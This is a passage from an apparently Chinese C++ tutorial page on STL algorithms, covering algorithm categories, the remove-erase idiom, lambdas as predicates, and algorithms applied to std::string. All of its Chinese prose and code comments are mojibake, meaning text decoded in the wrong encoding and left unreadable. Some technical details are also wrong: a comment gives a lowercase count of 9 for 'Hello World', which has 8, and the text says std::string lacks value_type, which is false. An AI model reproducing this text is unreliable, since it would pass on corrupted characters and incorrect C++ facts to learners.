class="line">&#125;</span><br></pre></td></tr></table></figure><p>è™½ç„¶æ—§çš„é€‚é…å™¨å·²è¢«åºŸå¼ƒï¼Œä½†ç†è§£å‡½æ•°å¯¹è±¡çš„åŸºæœ¬æ¦‚å¿µä»ç„¶å¾ˆé‡è¦ï¼Œå› ä¸ºå®ƒä»¬æ˜¯ STL è®¾è®¡çš„åŸºç¡€ï¼Œå¹¶ä¸” lambda è¡¨è¾¾å¼æœ¬è´¨ä¸Šå°±æ˜¯ç¼–è¯‘å™¨ä¸ºæˆ‘ä»¬è‡ªåŠ¨ç”Ÿæˆçš„åŒ¿åå‡½æ•°å¯¹è±¡ã€‚</p><h2 id="16-6-ç®—æ³•"><a href="#16-6-ç®—æ³•" class="headerlink" title="16.6 ç®—æ³•"></a>16.6 ç®—æ³•</h2><p>STL çš„ç¬¬ä¸‰ä¸ªä¸»è¦ç»„ä»¶æ˜¯**ç®—æ³• (Algorithms)**ã€‚STL æä¾›äº†å¤§é‡ç”¨äºå¤„ç†å®¹å™¨ï¼ˆæˆ–å…¶ä»–åºåˆ—ï¼‰ä¸­æ•°æ®çš„æ¨¡æ¿å‡½æ•°ï¼Œè¿™äº›å‡½æ•°ç»Ÿç§°ä¸ºç®—æ³•ã€‚å®ƒä»¬å®šä¹‰åœ¨ <code>&lt;algorithm&gt;</code> å¤´æ–‡ä»¶ä¸­ï¼ˆè¿˜æœ‰ä¸€äº›æ•°å€¼ç®—æ³•åœ¨ <code>&lt;numeric&gt;</code> ä¸­ï¼‰ã€‚</p><p>STL ç®—æ³•æ˜¯<strong>æ³›å‹</strong>çš„ï¼Œå®ƒä»¬é€šè¿‡<strong>è¿­ä»£å™¨</strong>ä½œç”¨äºå…ƒç´ èŒƒå›´ï¼Œè€Œä¸ä¾èµ–äºç‰¹å®šå®¹å™¨çš„å®ç°ã€‚è¿™ä½¿å¾—åŒä¸€ä¸ªç®—æ³•å¯ä»¥åº”ç”¨äº <code>vector</code>, <code>list</code>, <code>deque</code>, C é£æ ¼æ•°ç»„ç­‰å¤šç§æ•°æ®ç»“æ„ã€‚</p><h3 id="16-6-1-ç®—æ³•ç»„"><a href="#16-6-1-ç®—æ³•ç»„" class="headerlink" title="16.6.1 ç®—æ³•ç»„"></a>16.6.1 ç®—æ³•ç»„</h3><p>STL ç®—æ³•å¯ä»¥æ ¹æ®å…¶åŠŸèƒ½å¤§è‡´åˆ†ä¸ºå‡ ç±»ï¼š</p><ol><li><strong>éä¿®æ”¹åºåˆ—æ“ä½œ (Non-modifying sequence operations):</strong> è¿™äº›ç®—æ³•æ£€æŸ¥åºåˆ—ä¸­çš„å…ƒç´ ï¼Œä½†<strong>ä¸ä¿®æ”¹</strong>å…ƒç´ çš„å€¼ã€‚å®ƒä»¬é€šå¸¸è¿”å›ä¸€ä¸ªè¿­ä»£å™¨ã€ä¸€ä¸ªå¸ƒå°”å€¼æˆ–ä¸€ä¸ªè®¡æ•°å€¼ã€‚<ul><li>  ä¾‹å¦‚: <code>find</code>, <code>find_if</code>, <code>count</code>, <code>count_if</code>, <code>equal</code>, <code>search</code>, <code>for_each</code>ã€‚</li></ul></li><li><strong>ä¿®æ”¹åºåˆ—æ“ä½œ (Modifying sequence operations):</strong> è¿™äº›ç®—æ³•ä¼š<strong>ä¿®æ”¹</strong>åºåˆ—ä¸­çš„å…ƒç´ å€¼æˆ–å…ƒç´ é¡ºåºã€‚<ul><li>  ä¾‹å¦‚: <code>copy</code>, <code>copy_if</code>, <code>move</code>, <code>transform</code>, <code>replace</code>, <code>replace_if</code>, <code>fill</code>, <code>generate</code>, <code>remove</code>, <code>remove_if</code>, <code>unique</code>, <code>reverse</code>, <code>rotate</code>, <code>random_shuffle</code> (C++17 åºŸå¼ƒ), <code>shuffle</code> (C++11)ã€‚</li></ul></li><li><strong>æ’åºå’Œç›¸å…³æ“ä½œ (Sorting and related operations):</strong> ç”¨äºå¯¹åºåˆ—è¿›è¡Œæ’åºæˆ–æ‰§è¡ŒåŸºäºæ’åºçš„æ“ä½œã€‚<ul><li>  ä¾‹å¦‚: <code>sort</code>, <code>stable_sort</code>, <code>partial_sort</code>, <code>nth_element</code>, <code>binary_search</code>, <code>lower_bound</code>, <code>upper_bound</code>, <code>equal_range</code>, <code>merge</code>, <code>inplace_merge</code>ã€‚</li></ul></li><li><strong>æ•°å€¼æ“ä½œ (Numeric operations):</strong> å®šä¹‰åœ¨ <code>&lt;numeric&gt;</code> å¤´æ–‡ä»¶ä¸­ï¼Œç”¨äºæ‰§è¡Œæ•°å€¼è®¡ç®—ã€‚<ul><li>  ä¾‹å¦‚: <code>accumulate</code>, <code>inner_product</code>, <code>partial_sum</code>, <code>adjacent_difference</code>, <code>iota</code> (C++11)ã€‚</li></ul></li><li><strong>å †æ“ä½œ (Heap operations):</strong> ç”¨äºå°†èŒƒå›´ç»´æŠ¤æˆå †ç»“æ„ã€‚<ul><li>  ä¾‹å¦‚: <code>make_heap</code>, <code>push_heap</code>, <code>pop_heap</code>, <code>sort_heap</code>ã€‚</li></ul></li><li><strong>æœ€å°/æœ€å¤§æ“ä½œ (Min/max operations):</strong><ul><li>  ä¾‹å¦‚: <code>min</code>, <code>max</code>, <code>minmax</code> (C++11), <code>min_element</code>, <code>max_element</code>, <code>minmax_element</code> (C++11)ã€‚</li></ul></li><li><strong>æ’åˆ—æ“ä½œ (Permutation operations):</strong><ul><li>  ä¾‹å¦‚: <code>next_permutation</code>, <code>prev_permutation</code>ã€‚</li></ul></li></ol><h3 id="16-6-2-ç®—æ³•çš„é€šç”¨ç‰¹å¾"><a href="#16-6-2-ç®—æ³•çš„é€šç”¨ç‰¹å¾" class="headerlink" title="16.6.2 ç®—æ³•çš„é€šç”¨ç‰¹å¾"></a>16.6.2 ç®—æ³•çš„é€šç”¨ç‰¹å¾</h3><ul><li>  <strong>åŸºäºè¿­ä»£å™¨:</strong> ç®—æ³•é€šå¸¸æ¥å—ä¸€å¯¹è¿­ä»£å™¨ <code>first</code> å’Œ <code>last</code> ä½œä¸ºå‚æ•°ï¼ŒæŒ‡å®šè¦æ“ä½œçš„<strong>å·¦é—­å³å¼€åŒºé—´ <code>[first, last)</code>**ã€‚<code>last</code> æŒ‡å‘çš„æ˜¯è¦å¤„ç†çš„æœ€åä¸€ä¸ªå…ƒç´ çš„</strong>ä¸‹ä¸€ä¸ª**ä½ç½®ã€‚</li><li>  <strong>ä¸æ£€æŸ¥è¾¹ç•Œ:</strong> å¤§å¤šæ•°ç®—æ³•å‡å®šä¼ å…¥çš„è¿­ä»£å™¨èŒƒå›´æ˜¯æœ‰æ•ˆçš„ã€‚ä¼ é€’æ— æ•ˆèŒƒå›´ï¼ˆå¦‚ <code>end()</code> åœ¨ <code>begin()</code> ä¹‹å‰ï¼Œæˆ–è¿­ä»£å™¨æŒ‡å‘ä¸åŒå®¹å™¨ï¼‰ä¼šå¯¼è‡´æœªå®šä¹‰è¡Œä¸ºã€‚</li><li><strong>ä¸æ”¹å˜å®¹å™¨å¤§å° (é€šå¸¸):</strong> ä¿®æ”¹åºåˆ—çš„ç®—æ³•ï¼ˆå¦‚ <code>replace</code>, <code>remove</code>ï¼‰é€šå¸¸åª<strong>è¦†ç›–</strong>æˆ–<strong>ç§»åŠ¨</strong>å…ƒç´ ï¼Œè€Œ<strong>ä¸æ”¹å˜å®¹å™¨çš„å¤§å°</strong>ã€‚ä¾‹å¦‚ï¼Œ<code>remove</code> åªæ˜¯å°†ä¸è¢«ç§»é™¤çš„å…ƒç´ ç§»åŠ¨åˆ°åºåˆ—çš„å‰éƒ¨ï¼Œå¹¶è¿”å›ä¸€ä¸ªæŒ‡å‘æ–°çš„é€»è¾‘æœ«å°¾çš„è¿­ä»£å™¨ï¼Œå®ƒ<strong>ä¸ä¼š</strong>çœŸæ­£åˆ é™¤å®¹å™¨ä¸­çš„å…ƒç´ ã€‚é€šå¸¸éœ€è¦é…åˆå®¹å™¨çš„ <code>erase</code> æ–¹æ³•æ¥å®é™…åˆ é™¤å…ƒç´ ã€‚  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">5</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> val_to_remove = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ remove å°†æ‰€æœ‰ä¸ç­‰äº 2 çš„å…ƒç´ ç§»åˆ°å‰é¢</span></span><br><span class="line">    <span class="keyword">auto</span> new_end = <span class="built_in">std</span>::remove(v.begin(), v.end(), val_to_remove);</span><br><span class="line">    <span class="comment">// v ç°åœ¨å¯èƒ½æ˜¯ &#123;1, 3, 4, 5, ?, ?, ?&#125; (é—®å·ä»£è¡¨æœªå®šä¹‰çš„å€¼)</span></span><br><span class="line">    <span class="comment">// new_end æŒ‡å‘ç¬¬ä¸€ä¸ªé—®å·çš„ä½ç½® (é€»è¾‘ä¸Šçš„æ–°æœ«å°¾)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Vector after remove (before erase): &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> x : v) <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span>; <span class="comment">// è¾“å‡ºå¯èƒ½åŒ…å«æœªå®šä¹‰å€¼</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nSize before erase: &quot;</span> &lt;&lt; v.size() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// size ä»ç„¶æ˜¯ 7</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ erase åˆ é™¤ä» new_end åˆ°åŸå§‹æœ«å°¾çš„å…ƒç´ </span></span><br><span class="line">    v.erase(new_end, v.end());</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Vector after erase: &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> x : v) <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span>; <span class="comment">// è¾“å‡º: 1 3 4 5</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nSize after erase: &quot;</span> &lt;&lt; v.size() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// size å˜ä¸º 4</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>  <strong>æ¥å—å‡½æ•°å¯¹è±¡/Lambda:</strong> è®¸å¤šç®—æ³•æ¥å—ä¸€ä¸ªé¢å¤–çš„å‚æ•°ï¼ˆé€šå¸¸æ˜¯æœ€åä¸€ä¸ªå‚æ•°ï¼‰ï¼Œç”¨äºæŒ‡å®šè‡ªå®šä¹‰çš„æ¯”è¾ƒé€»è¾‘ï¼ˆå¦‚ <code>sort</code> çš„æ¯”è¾ƒå‡½æ•°ï¼‰ã€åˆ¤æ–­æ¡ä»¶ï¼ˆå¦‚ <code>find_if</code>, <code>count_if</code> çš„è°“è¯ï¼‰æˆ–è¦æ‰§è¡Œçš„æ“ä½œï¼ˆå¦‚ <code>for_each</code>, <code>transform</code> çš„å‡½æ•°ï¼‰ã€‚è¿™å¯ä»¥æ˜¯å‡½æ•°æŒ‡é’ˆã€å‡½æ•°å¯¹è±¡æˆ– lambda è¡¨è¾¾å¼ã€‚</li><li><strong>è°“è¯ (Predicate):</strong> æ¥å—ä¸€ä¸ªæˆ–ä¸¤ä¸ªå‚æ•°å¹¶è¿”å› <code>bool</code> å€¼çš„å¯è°ƒç”¨å®ä½“ã€‚<ul><li>  <strong>ä¸€å…ƒè°“è¯:</strong> <code>bool pred(const Type&amp; a)</code>ï¼Œç”¨äº <code>find_if</code>, <code>count_if</code>, <code>remove_if</code> ç­‰ã€‚</li><li>  <strong>äºŒå…ƒè°“è¯:</strong> <code>bool pred(const Type&amp; a, const Type&amp; b)</code>ï¼Œç”¨äº <code>sort</code>, <code>unique</code> ç­‰ï¼Œé€šå¸¸è¡¨ç¤ºæŸç§é¡ºåºå…³ç³»ï¼ˆå¦‚â€œå°äºâ€ï¼‰ã€‚</li></ul></li></ul><p><strong>ç¤ºä¾‹ (ä½¿ç”¨ç®—æ³•å’Œ Lambda):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;numeric&gt; // for accumulate</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Person</span> &#123;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; nums = &#123;<span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">6</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. find_if: æŸ¥æ‰¾ç¬¬ä¸€ä¸ªå¶æ•°</span></span><br><span class="line">    <span class="keyword">auto</span> it_even = <span class="built_in">std</span>::find_if(nums.begin(), nums.end(),</span><br><span class="line">                                [](<span class="keyword">int</span> x)&#123; <span class="keyword">return</span> x % <span class="number">2</span> == <span class="number">0</span>; &#125;);</span><br><span class="line">    <span class="keyword">if</span> (it_even != nums.end()) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;First even number: &quot;</span> &lt;&lt; *it_even &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 4</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. sort: æŒ‰ç»å¯¹å€¼å¤§å°æ’åº (è‡ªå®šä¹‰æ¯”è¾ƒ)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; mixed = &#123;<span class="number">3</span>, <span class="number">-1</span>, <span class="number">4</span>, <span class="number">-1</span>, <span class="number">5</span>, <span class="number">-9</span>, <span class="number">2</span>, <span class="number">-6</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::sort(mixed.begin(), mixed.end(),</span><br><span class="line">              [](<span class="keyword">int</span> a, <span class="keyword">int</span> b)&#123; <span class="keyword">return</span> <span class="built_in">std</span>::<span class="built_in">abs</span>(a) &lt; <span class="built_in">std</span>::<span class="built_in">abs</span>(b); &#125;);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sorted by absolute value: &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> x : mixed) <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span>; <span class="comment">// è¾“å‡º: -1 -1 2 3 4 5 -6 -9 (æˆ–ç±»ä¼¼ï¼Œå–å†³äºç¨³å®šæ’åº)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. transform: å°†æ‰€æœ‰å…ƒç´ å¹³æ–¹</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">squares</span><span class="params">(nums.size())</span></span>; <span class="comment">// ç›®æ ‡å®¹å™¨éœ€è¦è¶³å¤Ÿå¤§</span></span><br><span class="line">    <span class="built_in">std</span>::transform(nums.begin(), nums.end(), squares.begin(),</span><br><span class="line">                   [](<span class="keyword">int</span> x)&#123; <span class="keyword">return</span> x * x; &#125;);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Squares: &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> x : squares) <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span>; <span class="comment">// è¾“å‡º: 9 1 16 1 25 81 4 36</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. accumulate: è®¡ç®—æ‰€æœ‰å…ƒç´ çš„å’Œ</span></span><br><span class="line">    <span class="keyword">int</span> sum = <span class="built_in">std</span>::accumulate(nums.begin(), nums.end(), <span class="number">0</span>); <span class="comment">// 0 æ˜¯åˆå§‹å€¼</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sum: &quot;</span> &lt;&lt; sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 31</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. for_each: å¯¹æ¯ä¸ªå…ƒç´ æ‰§è¡Œæ“ä½œ</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;Person&gt; people = &#123;&#123;<span class="string">&quot;Alice&quot;</span>, <span class="number">30</span>&#125;, &#123;<span class="string">&quot;Bob&quot;</span>, <span class="number">25</span>&#125;, &#123;<span class="string">&quot;Charlie&quot;</span>, <span class="number">35</span>&#125;&#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;People: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::for_each(people.begin(), people.end(),</span><br><span class="line">                  [](<span class="keyword">const</span> Person&amp; p)&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; p.name &lt;&lt; <span class="string">&quot;(&quot;</span> &lt;&lt; p.age &lt;&lt; <span class="string">&quot;) &quot;</span>; &#125;);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º: Alice(30) Bob(25) Charlie(35)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="16-6-3-STL-å’Œ-string-ç±»"><a href="#16-6-3-STL-å’Œ-string-ç±»" class="headerlink" title="16.6.3 STL å’Œ string ç±»"></a>16.6.3 STL å’Œ string ç±»</h3><p><code>std::string</code> ç±»è™½ç„¶ä¸æ˜¯ STL å®¹å™¨ï¼ˆå®ƒæ²¡æœ‰ <code>value_type</code> ç­‰åµŒå¥—ç±»å‹å®šä¹‰ï¼‰ï¼Œä½†å®ƒæä¾›äº†ä¸ STL å…¼å®¹çš„æ¥å£ï¼Œç‰¹åˆ«æ˜¯<strong>è¿­ä»£å™¨</strong> (<code>begin()</code>, <code>end()</code> ç­‰ï¼‰ã€‚å› æ­¤ï¼Œè®¸å¤š STL ç®—æ³•å¯ä»¥ç›´æ¥åº”ç”¨äº <code>std::string</code> å¯¹è±¡ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cctype&gt; // for ::tolower</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> str = <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ find æŸ¥æ‰¾å­—ç¬¦</span></span><br><span class="line">    <span class="keyword">auto</span> it_l = <span class="built_in">std</span>::find(str.begin(), str.end(), <span class="string">&#x27;l&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (it_l != str.end()) &#123;</span><br><span class="line">        <span class="comment">// è®¡ç®—ç´¢å¼•</span></span><br><span class="line">        <span class="keyword">size_t</span> index = <span class="built_in">std</span>::distance(str.begin(), it_l);</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&#x27;l&#x27; first found at index: &quot;</span> &lt;&lt; index &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 2</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ count_if ç»Ÿè®¡å°å†™å­—æ¯æ•°é‡</span></span><br><span class="line">    <span class="keyword">int</span> lower_count = <span class="built_in">std</span>::count_if(str.begin(), str.end(),</span><br><span class="line">                                   [](<span class="keyword">char</span> c)&#123; <span class="keyword">return</span> <span class="built_in">std</span>::<span class="built_in">islower</span>(c); &#125;);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Lowercase count: &quot;</span> &lt;&lt; lower_count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 9</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ transform å°†å­—ç¬¦ä¸²è½¬ä¸ºå°å†™</span></span><br><span class="line">    <span class="built_in">std</span>::transform(str.begin(), str.end(), str.begin(), <span class="comment">// å¯ä»¥åŸåœ°ä¿®æ”¹</span></span><br><span class="line">                   [](<span class="keyword">unsigned</span> <span class="keyword">char</span> c)&#123; <span class="keyword">return</span> <span class="built_in">std</span>::<span class="built_in">tolower</span>(c); &#125;); <span class="comment">// ä½¿ç”¨ unsigned char é¿å…è´Ÿå€¼é—®é¢˜</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Lowercase string: &quot;</span> &lt;&lt; str &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º: hello world</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ reverse åè½¬å­—ç¬¦ä¸²</span></span><br><span class="line">    <span class="built_in">std</span>::reverse(str.begin(), str.end());</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Reversed string: &quot;</span> &lt;&lt; str &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º: dlrow olleh</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è™½ç„¶ <code>string</code> ç±»æœ¬èº«ä¹Ÿæä¾›äº†è®¸å¤šæˆå‘˜å‡½æ•°ï¼ˆå¦‚ <code>find</code>, <code>replace</code>ï¼‰ï¼Œä½†ä½¿ç”¨ STL ç®—æ³•æœ‰æ—¶å¯ä»¥æä¾›æ›´é€šç”¨æˆ–æ›´å¼ºå¤§çš„åŠŸèƒ½ï¼ˆä¾‹å¦‚é…åˆ lambda ä½¿ç”¨å¤æ‚æ¡ä»¶ï¼‰ã€‚</p><h3 id="16-6-4-å‡½æ•°å’Œå®¹å™¨æ–¹æ³•"><a href="#16-6-4-å‡½æ•°å’Œå®¹å™¨æ–¹æ³•" class="headerlink" title="16.6.4 å‡½æ•°å’Œå®¹å™¨æ–¹æ³•"></a>16.6.4 å‡½æ•°å’Œå®¹å™¨æ–¹æ³•</h3><p>æœ‰æ—¶ï¼Œå®¹å™¨æœ¬èº«æä¾›äº†ä¸æŸä¸ª STL ç®—æ³•åŠŸèƒ½ç›¸ä¼¼çš„<strong>æˆå‘˜å‡½æ•°</strong>ã€‚ä¾‹å¦‚ï¼š</p><ul><li>  <code>list</code> æœ‰è‡ªå·±çš„ <code>sort()</code> æˆå‘˜å‡½æ•°ã€‚</li><li>  <code>list</code> æœ‰è‡ªå·±çš„ <code>remove()</code> å’Œ <code>remove_if()</code> æˆå‘˜å‡½æ•°ã€‚</li><li>  <code>list</code> æœ‰è‡ªå·±çš„ <code>unique()</code> æˆå‘˜å‡½æ•°ã€‚</li><li>  <code>set</code>, <code>map</code> ç­‰å…³è”å®¹å™¨æœ‰ <code>find()</code> æˆå‘˜å‡½æ•°ã€‚</li></ul><p><strong>ä½•æ—¶ä½¿ç”¨æˆå‘˜å‡½æ•° vs. STL ç®—æ³•ï¼Ÿ</strong></p><ul><li><strong>ä¼˜å…ˆä½¿ç”¨æˆå‘˜å‡½æ•° (å¦‚æœå¯ç”¨ä¸”æ»¡è¶³éœ€æ±‚):</strong> å®¹å™¨çš„æˆå‘˜å‡½æ•°é€šå¸¸èƒ½æ›´å¥½åœ°åˆ©ç”¨å®¹å™¨çš„å†…éƒ¨ç»“æ„è¿›è¡Œä¼˜åŒ–ã€‚<ul><li>  ä¾‹å¦‚ï¼Œ<code>list::sort()</code> æ¯” <code>std::sort(list.begin(), list.end())</code> (å¦‚æœ <code>list</code> è¿­ä»£å™¨æ”¯æŒçš„è¯ï¼Œä½†å®ƒä¸æ”¯æŒéšæœºè®¿é—®ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨ <code>std::sort</code>) æ›´é«˜æ•ˆï¼Œå› 